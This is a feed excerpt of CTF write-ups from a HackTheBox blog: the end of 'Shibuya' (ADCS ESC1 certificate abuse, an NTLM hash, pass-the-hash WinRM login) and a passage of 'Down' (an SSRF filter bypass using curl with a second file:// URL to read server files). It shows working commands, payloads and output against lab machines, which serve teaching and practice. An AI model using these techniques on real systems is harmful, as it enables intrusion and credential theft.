<code class="language-plaintext highlighter-rouge">auth</code> command with that certificate still fails:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy auth <span class="nt">-pfx</span> _admin.pfx <span class="nt">-dc-ip</span> 127.0.0.1 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: _admin@shibuya.vl [*] Trying to get TGT... |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:88-&lt;&gt;&lt;&gt;-OK [-] Object SID mismatch between certificate and user '_admin' </span></code></pre></div></div> <p>Reading through <a href="https://github.com/ly4k/Certipy/issues/208">this issue</a> says that I need to provide the <code class="language-plaintext highlighter-rouge">-sid</code> flag for the targeted user, which I’ll get from BloodHound:</p> <picture> <source type="image/webp" srcset="/img/image-20250513151958174.webp" /> <img loading="lazy" src="/img/image-20250513151958174.png" alt="image-20250513151958174" class="include_image " /> </picture> <p>I’ll request another certificate:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy req <span class="nt">-u</span> nigel.mills <span class="nt">-p</span> Sail2Boat3 <span class="nt">-dc-ip</span> 127.0.0.1 <span class="nt">-ca</span> shibuya-AWSJPDC0522-CA <span class="nt">-template</span> ShibuyaWeb <span class="nt">-upn</span> _admin@shibuya.vl <span class="nt">-target</span> AWSJPDC0522.shibuya.vl <span class="nt">-key-size</span> 4096 <span class="nt">-sid</span> S-1-5-21-87560095-894484815-3652015022-500 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:445-&lt;&gt;&lt;&gt;-OK [*] Successfully requested certificate [*] Request ID is 11 [*] Got certificate with UPN '_admin@shibuya.vl' [*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500' [*] Saved certificate and private key to '_admin.pfx' </span></code></pre></div></div> <p>This time when I <code class="language-plaintext highlighter-rouge">auth</code> it gives a TGT for the account as well as the NTLM hash:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy auth <span class="nt">-pfx</span> _admin.pfx <span class="nt">-dc-ip</span> 127.0.0.1 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: _admin@shibuya.vl [*] Trying to get TGT... |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:88-&lt;&gt;&lt;&gt;-OK [*] Got TGT [*] Saved credential cache to '_admin.ccache' [*] Trying to retrieve NT hash for '_admin' |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:88-&lt;&gt;&lt;&gt;-OK [*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430 </span></code></pre></div></div> <h3 id="winrm">WinRM</h3> <p>TCP 5985 isn’t available from my host, but it is open on Shibuya:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">shibuya\nigel.mills@AWSJPDC0522 C:\ProgramData&gt;</span><span class="n">netstat</span><span class="w"> </span><span class="nt">-ano</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">LISTENING</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="nx">5985</span><span class="w"> </span><span class="go"> TCP 0.0.0.0:5985 0.0.0.0:0 LISTENING 4 TCP [::]:5985 [::]:0 LISTENING 4 </span></code></pre></div></div> <p>I’ll use <code class="language-plaintext highlighter-rouge">proxychains</code> to connect over my existing socks proxy:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains evil-winrm <span class="nt">-i</span> 127.0.0.1 <span class="nt">-u</span> _admin <span class="nt">-H</span> bab5b2a004eabb11d865f31912b6b430 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:5985-&lt;&gt;&lt;&gt;-OK </span><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</span><span class="w"> </span></code></pre></div></div> <p>And grab the root flag:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">*Evil-WinRM* PS C:\Users\Administrator\desktop&gt;</span><span class="w"> </span><span class="kr">type</span><span class="w"> </span><span class="n">root.txt</span><span class="w"> </span><span class="go">5b150cc7************************ </span></code></pre></div></div> ]]>
</content>
<author>
<name/>
</author>
<category term="ctf"/>
<category term="hackthebox"/>
<category term="htb-shibuya"/>
<category term="pentest"/>
<category term="bug-bounty"/>
<category term="hackthebox"/>
<category term="htb-shibuya"/>
<category term="vulnlab"/>
<category term="ctf"/>
<category term="nmap"/>
<category term="netexec"/>
<category term="kerbrute"/>
<category term="credentials"/>
<category term="windows-imaging"/>
<category term="wim"/>
<category term="secretsdump"/>
<category term="crackstation"/>
<category term="password-spray"/>
<category term="bloodhound"/>
<category term="sharphound"/>
<category term="adcs"/>
<category term="cross-session-relay"/>
<category term="runascs"/>
<category term="quinsta"/>
<category term="remotepotato0"/>
<category term="windows-firewall"/>
<category term="firewall-enumeration"/>
<category term="hashcat"/>
<category term="certipy"/>
<category term="esc1"/>
<category term="proxychains"/>
<category term="htb-rebound"/>
<summary type="html">
<![CDATA[ Shibuya starts with a brute force user enumeration over Kerberos, finding two machine accounts with their passwords set to their username. I’ll use those to enumerate LDAP, finding credentials for a service account in a comment. That user has access to an SMB share with three Windows Imaging images, and one contains backups of the registry hives. I’ll dump hashes from these, and spray them to get access to another user and a shell. There’s another user logged into the box, and I’ll use RemotePotato0 to get a shell with a cross session relay attack. This user can exploit ESC1 in the ADCS configuration to get administrator access. ]]>
</summary>
<media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://0xdf.gitlab.io/img/shibuya-cover.png"/>
<media:content xmlns:media="http://search.yahoo.com/mrss/" medium="image" url="https://0xdf.gitlab.io/img/shibuya-cover.png"/>
</entry>
<entry>
<title type="html">HTB: Down</title>
<link href="https://0xdf.gitlab.io/2025/06/17/htb-down.html" rel="alternate" type="text/html" title="HTB: Down"/>
<published>2025-06-17T09:00:00+00:00</published>
<updated>2025-06-17T09:00:00+00:00</updated>
<id>https://0xdf.gitlab.io/2025/06/17/htb-down</id>
<content type="html" xml:base="https://0xdf.gitlab.io/2025/06/17/htb-down.html">
<![CDATA[ <picture> <source type="image/webp" srcset="/img/down-cover.webp" /> <img loading="lazy" src="/img/down-cover.png" alt="Down" style="float: right; margin-right:50px; margin-left:50px; height:150px;" class="include_image " /> </picture> <p>Down has a website designed to check if a website is up. This presents an obvious SSRF, but to bypass filters and exploit it I’ll have to abuse curl’s feature of taking multiple URLs and pass a second URL with the file schema to read from the host.I’ll get access to the page source, and see there’s an expert mode that will make a raw TCP connection with netcat. I’ll use parameter injection there to get a shell. From there, I’ll dig into a pswm instance to get the next user’s password, and they have a simple sudo rule to root.</p> <h2 id="box-info">Box Info</h2> <!-- https://app.hackthebox.com/machines/666 --> <table> <thead> <tr> <th>Name</th> <th style="text-align: right"><a href="https://hackthebox.com/machines/down" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Down</a> <a href="https://hackthebox.com/machines/down" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-down.webp" /> <img src="/icons/box-down.png" alt="Down" class="img-av" /></picture></a><br /><a href="https://hackthebox.com/machines/down" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th> </tr> </thead> <tbody> <tr> <td>Release Date</td> <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1935366938143736130">14 Jun 2025</a></td> </tr> <tr> <td>Retire Date</td> <td style="text-align: right">14 Jun 2025</td> </tr> <tr> <td>OS</td> <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td> </tr> <tr> <td>Base Points</td> <td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td> <td style="text-align: right">N/A (non-competitive)</td> </tr> <tr> <td>Creators</td> <td style="text-align: right"><a href="https://app.hackthebox.com/users/77141" target="_blank" rel="noopener"><img alt="jkr" src="https://www.hackthebox.com/badge/image/77141" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> jkr</span></a><br /> <a href="https://app.hackthebox.com/users/13569" target="_blank" rel="noopener"><img alt="xct" src="https://www.hackthebox.com/badge/image/13569" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> xct</span></a><br /></td> </tr> </tbody> </table> <h2 id="recon">Recon</h2> <h3 id="initial-scanning">Initial Scanning</h3> <p><code class="language-plaintext highlighter-rouge">nmap</code> finds two open TCP ports, SSH (22) and HTTP (80):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.129.234.87 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 04:25 UTC Nmap scan report for 10.129.234.87 Host is up (0.093s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 6.86 seconds </span><span class="gp">oxdf@hacky$</span><span class="w"> </span>nmap <span class="nt">-vv</span> <span class="nt">-p</span> 22,80 <span class="nt">-sCV</span> 10.129.234.87 <span class="go">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-03 04:26 UTC ...[snip]... Nmap scan report for 10.129.234.87 Host is up, received echo-reply ttl 63 (0.092s latency). Scanned at 2025-05-03 04:26:02 UTC for 10s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 f6:cc:21:7c:ca:da:ed:34:fd:04:ef:e6:f9:4c:dd:f8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9eTcP2DDxJHJ2uCdOmMRIPaoOhvMFXL33f1pZTIe0VTdeHRNYlpm2a2PumsO5t88M7QF3L3d6n1eRHTTAskGw= | 256 fa:06:1f:f4:bf:8c:e3:b0:c8:40:21:0d:57:06:dd:11 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwLt0rmihlvq9pk6BmFhjTycNR54yApKIrnwI8xzYx/ 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu)) |_http-title: Is it down or just me? | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.52 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ...[snip]... Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds Raw packets sent: 6 (240B) | Rcvd: 3 (116B) </span></code></pre></div></div> <p>Based on the <a href="/cheatsheets/os#ubuntu">OpenSSH and Apache</a> versions, the host is likely running Ubuntu 22.04 jammy (or maybe 22.10 kinetic).</p> <h3 id="website---tcp-80">Website - TCP 80</h3> <h4 id="site">Site</h4> <p>The website is designed to check if another website is up:</p> <picture> <source type="image/webp" srcset="/img/image-20250502163054293.webp" /> <img loading="lazy" src="/img/image-20250502163054293.png" alt="image-20250502163054293" class="include_image " /> </picture> <p>If I enter a site on the internet it just hangs for a minute and eventually reports:</p> <picture> <source type="image/webp" srcset="/img/image-20250502163631287.webp" /> <img loading="lazy" src="/img/image-20250502163631287.png" alt="image-20250502163631287" class="include_image " /> </picture> <p>If I host a webserver on my machine and give it my IP, it makes a request to my site:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python <span class="nt">-m</span> http.server 80 <span class="go">Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.234.87 - - [03/May/2025 04:40:08] "GET / HTTP/1.1" 200 - </span></code></pre></div></div> <p>And shows it’s up:</p> <picture> <source type="image/webp" srcset="/img/image-20250502163800416.webp" /> <img loading="lazy" src="/img/image-20250502163800416.png" alt="image-20250502163800416" class="include_image " /> </picture> <p>Similarly, if I request <code class="language-plaintext highlighter-rouge">http://localhost</code>, it returns up:</p> <picture> <source type="image/webp" srcset="/img/image-20250502163834335.webp" /> <img loading="lazy" src="/img/image-20250502163834335.png" alt="image-20250502163834335" class="include_image " /> </picture> <h4 id="tech-stack">Tech Stack</h4> <p>The HTTP response headers don’t show anything beyond Apache:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span> <span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 02 May 2025 20:41:25 GMT</span> <span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.52 (Ubuntu)</span> <span class="na">Vary</span><span class="p">:</span> <span class="s">Accept-Encoding</span> <span class="na">Content-Length</span><span class="p">:</span> <span class="s">739</span> <span class="na">Keep-Alive</span><span class="p">:</span> <span class="s">timeout=5, max=100</span> <span class="na">Connection</span><span class="p">:</span> <span class="s">Keep-Alive</span> <span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span> </code></pre></div></div> <p>The 404 page is the <a href="/cheatsheets/404#apache--httpd">default Apache 404</a>:</p> <picture> <source type="image/webp" srcset="/img/image-20250502164100772.webp" /> <img loading="lazy" src="/img/image-20250502164100772.png" alt="image-20250502164100772" class="include_image " /> </picture> <p>Looking at the logs in Burp Proxy of my interactions with the site, the POST requests submitting the form go to <code class="language-plaintext highlighter-rouge">index.php</code>, suggesting this is a PHP site. The main page loads as <code class="language-plaintext highlighter-rouge">/index.php</code> as well.</p> <p>If I look at the headers when the site sends a request to my server, I’ll see it’s using <code class="language-plaintext highlighter-rouge">curl</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>nc <span class="nt">-lnnp</span> 80 <span class="go">GET / HTTP/1.1 Host: 10.10.14.79 User-Agent: curl/7.81.0 Accept: */* </span></code></pre></div></div> <p>That’s not surprising, as <a href="https://www.php.net/manual/en/book.curl.php">curl is integrated into PHP</a>.</p> <h4 id="directory-brute-force">Directory Brute Force</h4> <p>I’ll run <code class="language-plaintext highlighter-rouge">feroxbuster</code> against the site, and include <code class="language-plaintext highlighter-rouge">-x php</code> since I know the site is PHP:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.129.234.87 <span class="nt">-x</span> php <span class="go"> ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \ \_/ | | \ |__ | |___ | \ | \ | \__, \__/ / \ | |__/ |___ by Ben "epi" Risher 🤓 ver: 2.11.0 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.129.234.87 🚀 Threads │ 50 📖 Wordlist │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 👌 Status Codes │ All Status Codes! 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.11.0 🔎 Extract Links │ true 💲 Extensions │ [php] 🏁 HTTP methods │ [GET] 🔃 Recursion Depth │ 4 ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Management Menu™ ────────────────────────────────────────────────── </span><span class="feroxbuster-red">404</span><span class="go"> GET 9l 31w 275c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go"> </span><span class="feroxbuster-red">403</span><span class="go"> GET 9l 28w 278c </span><span class="feroxbuster-green">Auto-filtering </span><span class="go">found </span><span class="feroxbuster-red">404</span><span class="go">-like response and created new filter; toggle off with </span><span class="feroxbuster-yellow">--dont-filter</span><span class="go"> </span><span class="feroxbuster-green">200</span><span class="go"> GET 27l 70w 739c http://10.129.234.87/index.php </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 9l 28w 319c http://10.129.234.87/javascript =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.87/javascript/</span><span class="go"> </span><span class="feroxbuster-green">200</span><span class="go"> GET 93l 207w 1794c http://10.129.234.87/style.css </span><span class="feroxbuster-green">200</span><span class="go"> GET 1302l 7419w 578132c http://10.129.234.87/logo.png </span><span class="feroxbuster-green">200</span><span class="go"> GET 27l 70w 739c http://10.129.234.87/ </span><span class="feroxbuster-yellow">301</span><span class="go"> GET 9l 28w 326c http://10.129.234.87/javascript/jquery =&gt; </span><span class="feroxbuster-yellow">http://10.129.234.87/javascript/jquery/</span><span class="go"> </span><span class="feroxbuster-green">200</span><span class="go"> GET 10879l 44396w 288550c http://10.129.234.87/javascript/jquery/jquery [</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m 90015/90015 0s </span><span class="feroxbuster-green">found</span><span class="go">:7 </span><span class="feroxbuster-red">errors</span><span class="go">:9 [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 30000/30000 227/s http://10.129.234.87/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 30000/30000 233/s http://10.129.234.87/javascript/ [</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 2m 30000/30000 239/s http://10.129.234.87/javascript/jquery/ </span></code></pre></div></div> <p>Nothing at all interesting. This looks very much like a one page site.</p> <h2 id="shell-as-www-data">Shell as www-data</h2> <h3 id="port-scan-fail">Port Scan [Fail]</h3> <p>My first thought is to look for other open HTTP servers on the host that may only be only on localhost or maybe blocked by a firewall. I’ll set up a <code class="language-plaintext highlighter-rouge">ffuf</code> scan to brute force all possible ports. This is a bit tricky for two reasons:</p> <ul> <li>I have to include the <code class="language-plaintext highlighter-rouge">Content-Type</code> header, or the site doesn’t process the POST data and it returns the page with no results.</li> <li><code class="language-plaintext highlighter-rouge">ffuf</code> doesn’t have a <code class="language-plaintext highlighter-rouge">range</code> input the way that <code class="language-plaintext highlighter-rouge">wfuzz</code> did, so I have to make a wordlist of numbers to put in. I’ll use the <code class="language-plaintext highlighter-rouge">seq</code> command, and I like to use <a href="https://en.wikipedia.org/wiki/Process_substitution">process substitution</a> to do it inline. <code class="language-plaintext highlighter-rouge">&lt;( command )</code> tells <code class="language-plaintext highlighter-rouge">bash</code> to handle the output of <code class="language-plaintext highlighter-rouge">command</code> as if it were a file.</li> </ul> <p>The other args I’ll use are:</p> <ul> <li><code class="language-plaintext highlighter-rouge">-u http://10.129.234.87/index.php</code> - The URL to send to.</li> <li><code class="language-plaintext highlighter-rouge">-d url=http://%3A%2F%2Flocalhost:FUZZ</code> - The POST data, URL-encoded.</li> <li><code class="language-plaintext highlighter-rouge">-fr 'for everyone'</code> - Filter out responses with the string “for everyone” to get just the open ports.</li> </ul> <p>When getting this command working, I like to start with a small range that contains a port I know should work, like <code class="language-plaintext highlighter-rouge">-w &lt;(seq 75 85)</code>, and when I get the expected response, then expand it to the full range:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ffuf <span class="nt">-u</span> http://10.129.234.87/index.php <span class="nt">-d</span> <span class="s1">'url=http%3A%2F%2Flocalhost:FUZZ'</span> <span class="nt">-w</span> &lt;<span class="o">(</span><span class="nb">seq </span>1 65535<span class="o">)</span> <span class="nt">-H</span> <span class="s1">'Content-Type: application/x-www-form-urlencoded'</span> <span class="nt">-fr</span> <span class="s1">'for everyone'</span> <span class="go"> /'___\ /'___\ /'___\ /\ \__/ /\ \__/ __ __ /\ \__/ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/ \ \_\ \ \_\ \ \____/ \ \_\ \/_/ \/_/ \/___/ \/_/ v2.1.0-dev ________________________________________________ :: Method : POST :: URL : http://10.129.234.87/index.php :: Wordlist : FUZZ: /dev/fd/63 :: Header : Content-Type: application/x-www-form-urlencoded :: Data : url=http%3A%2F%2Flocalhost:FUZZ :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Regexp: for everyone ________________________________________________ 80 [Status: 200, Size: 1961, Words: 271, Lines: 54, Duration: 4523ms] :: Progress: [65535/65535] :: Job [1/1] :: 126 req/sec :: Duration: [0:10:07] :: Errors: 0 :: </span></code></pre></div></div> <p>Nothing.</p> <h3 id="file-read">File Read</h3> <h4 id="identify-filter">Identify Filter</h4> <p>The next thing I’ll try is if I can use the <code class="language-plaintext highlighter-rouge">file://</code> protocol instead of <code class="language-plaintext highlighter-rouge">http://</code> to read files on the host. I’ll send a POST request to Burp Repeater and give it a try:</p> <picture> <source type="image/webp" srcset="/img/image-20250502170642263.webp" /> <img loading="lazy" src="/img/image-20250502170642263.png" alt="image-20250502170642263" class="include_image " /> </picture> <p>It fails.</p> <h4 id="understand-filter">Understand Filter</h4> <p>I’ll poke at the filter a bit more to get a feel for how it works. It seems to just be checking the start of the string for “http://” and “https://”. When I add “http:/” to the front, it gets filtered:</p> <picture> <source type="image/webp" srcset="/img/image-20250502171035039.webp" /> <img loading="lazy" src="/img/image-20250502171035039.png" alt="image-20250502171035039" class="include_image " /> </picture> <p>One more “/” and it gets past:</p> <picture> <source type="image/webp" srcset="/img/image-20250502171111521.webp" /> <img loading="lazy" src="/img/image-20250502171111521.png" alt="image-20250502171111521" class="include_image " /> </picture> <h4 id="curl">curl</h4> <p>An interesting trick about <code class="language-plaintext highlighter-rouge">curl</code> is that if I give it multiple URLs, it will fetch both. For example:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http://localhost/test1 http://localhost/test2 <span class="go">&lt;!DOCTYPE HTML&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Error response&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error response&lt;/h1&gt; &lt;p&gt;Error code: 404&lt;/p&gt; &lt;p&gt;Message: File not found.&lt;/p&gt; &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; &lt;!DOCTYPE HTML&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;Error response&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error response&lt;/h1&gt; &lt;p&gt;Error code: 404&lt;/p&gt; &lt;p&gt;Message: File not found.&lt;/p&gt; &lt;p&gt;Error code explanation: 404 - Nothing matches the given URI.&lt;/p&gt; &lt;/body&gt; &lt;/html&gt; </span></code></pre></div></div> <p>There’s two 404 pages there, and at my Python webserver, two failed requests:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">127.0.0.1 - - [03/May/2025 05:53:23] code 404, message File not found 127.0.0.1 - - [03/May/2025 05:53:23] "GET /test1 HTTP/1.1" 404 - 127.0.0.1 - - [03/May/2025 05:53:23] code 404, message File not found 127.0.0.1 - - [03/May/2025 05:53:23] "GET /test2 HTTP/1.1" 404 - </span></code></pre></div></div> <h4 id="file-read-1">File Read</h4> <p>With that in mind, I’ll try a space between a legit URL and a <code class="language-plaintext highlighter-rouge">file://</code> URL:</p> <picture> <source type="image/webp" srcset="/img/image-20250502173332836.webp" /> <img loading="lazy" src="/img/image-20250502173332836.png" alt="image-20250502173332836" class="include_image " /> </picture> <p>It works! I can also just break the first URL to only get the file read:</p> <picture> <source type="image/webp" srcset="/img/image-20250502173410449.webp" /> <img loading="lazy" src="/img/image-20250502173410449.png" alt="image-20250502173410449" class="include_image " /> </picture> <p>That’s kind of like doing this:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="nt">-s</span> http:// file:///etc/hostname <span class="go">hacky </span></code></pre></div></div> <h3 id="filesystem-enumeration">Filesystem Enumeration</h3> <p>The current process is a <code class="language-plaintext highlighter-rouge">curl</code> process with <code class="language-plaintext highlighter-rouge">-s</code> and both URLs:</p> <picture> <source type="image/webp" srcset="/img/image-20250502173554422.webp" /> <img loading="lazy" src="/img/image-20250502173554422.png" alt="image-20250502173554422" class="include_image " /> </picture> <p>I’ll switch to command line. I can get the environment variables for the current process (and with some <code class="language-plaintext highlighter-rouge">bash</code> to clean it up):</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>curl <span class="s1">'http://10.129.234.87/index.php'</span> <span class="nt">-d</span> <span class="s1">'url=http:// file:///proc/self/environ'</span> <span class="nt">-o-</span> <span class="nt">-s</span> | <span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'s:.*&lt;pre&gt;\(.*\)&lt;/pre&gt;.*:\1:p'</span> | <span class="nb">tr</span> <span class="s1">'\000'</span> <span class="s1">'\n'</span> <span class="go">APACHE_RUN_DIR=/var/run/apache2 SYSTEMD_EXEC_PID=864 APACHE_PID_FILE=/var/run/apache2/apache2.pid JOURNAL_STREAM=8:21130 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin INVOCATION_ID=0320944a871242e8aea7f3bd1efad651 APACHE_LOCK_DIR=/var/lock/apache2 LANG=C APACHE_RUN_USER=www-data APACHE_RUN_GROUP=www-data APACHE_LOG_DIR=/var/log/apache2 PWD=/var/www/html </span></code></pre></div></div> <p>I’ll grab the page source with <code class="language-plaintext highlighter-rouge">-d 'url=http:// file:///proc/self/cwd/index.php'</code>. The results are HTML encoded, so I’ll copy them into Burp Decoder and decode:</p> <picture> <source type="image/webp" srcset="/img/image-20250502174313421.webp" /> <img loading="lazy" src="/img/image-20250502174313421.png" alt="image-20250502174313421" class="include_image " /> </picture> <h3 id="source-analysis">Source Analysis</h3> <h4 id="identify-expert-mode">Identify Expert Mode</h4> <p>Right towards the top of the <code class="language-plaintext highlighter-rouge">body</code> there’s an <code class="language-plaintext highlighter-rouge">if</code> branch:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;body&gt;</span> <span class="nt">&lt;header&gt;</span> <span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"/logo.png"</span> <span class="na">alt=</span><span class="s">"Logo"</span><span class="nt">&gt;</span> <span class="nt">&lt;h2&gt;</span>Is it down or just me?<span class="nt">&lt;/h2&gt;</span> <span class="nt">&lt;/header&gt;</span> <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span> <span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'expertmode'</span><span class="p">]</span> <span class="o">===</span> <span class="s1">'tcp'</span> <span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s1">'&lt;h1&gt;Is the port refused, or is it just you?&lt;/h1&gt; &lt;form id="urlForm" action="index.php?expertmode=tcp" method="POST"&gt; &lt;input type="text" id="url" name="ip" placeholder="Please enter an IP." required&gt;&lt;br&gt; &lt;input type="number" id="port" name="port" placeholder="Please enter a port number." required&gt;&lt;br&gt; &lt;button type="submit"&gt;Is it refused?&lt;/button&gt; &lt;/form&gt;'</span><span class="p">;</span> <span class="p">}</span> <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s1">'&lt;h1&gt;Is that website down, or is it just you?&lt;/h1&gt; &lt;form id="urlForm" action="index.php" method="POST"&gt; &lt;input type="url" id="url" name="url" placeholder="Please enter a URL." required&gt;&lt;br&gt; &lt;button type="submit"&gt;Is it down?&lt;/button&gt; &lt;/form&gt;'</span><span class="p">;</span> <span class="p">}</span> </code></pre></div></div> <p>It’s looking for an <code class="language-plaintext highlighter-rouge">expertmode</code> parameter with the value “tcp”! I’ll try adding <code class="language-plaintext highlighter-rouge">?expertmode=tcp</code> to the end of the URL and a different text does load:</p> <picture> <source type="image/webp" srcset="/img/image-20250502174557277.webp" /> <img loading="lazy" src="/img/image-20250502174557277.png" alt="image-20250502174557277" class="include_image 